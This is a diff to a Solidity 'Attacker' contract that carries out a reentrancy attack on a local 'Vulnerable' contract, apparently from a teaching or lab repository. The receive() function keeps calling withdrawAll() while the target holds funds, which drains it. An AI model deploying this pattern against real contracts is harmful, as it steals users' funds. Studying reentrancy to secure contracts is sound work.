@@ -4,25 +4,21 @@ pragma solidity ^0.8.13;
 import {Vulnerable} from "./Vulnerable.sol";
 
 contract Attacker {
-    Vulnerable public target;
+    Vulnerable public vulnerable;
 
-    constructor(address _target) {
-        target = Vulnerable(_target);
-    }
-
-    receive() external payable {
-        if (address(target).balance >= 0) {
-            target.withdrawAll();
-        }
+    constructor(address _vulnerable) {
+        vulnerable = Vulnerable(_vulnerable);
     }
 
     function exploit() public payable {
-        require(msg.value >= 1 ether, "Exploit error!");
-        target.deposit{value: msg.value}();
-        target.withdrawAll();
+        require(msg.value >= 1 ether, "Deposit cannot be empty else exploit will not work!");
+        vulnerable.deposit{value: msg.value}();
+        vulnerable.withdrawAll();
     }
 
-    function getBalance() external view returns (uint256) {
-        return address(this).balance;
+    receive() external payable {
+        if (address(vulnerable).balance > 0) {
+            vulnerable.withdrawAll();
+        }
     }
 }
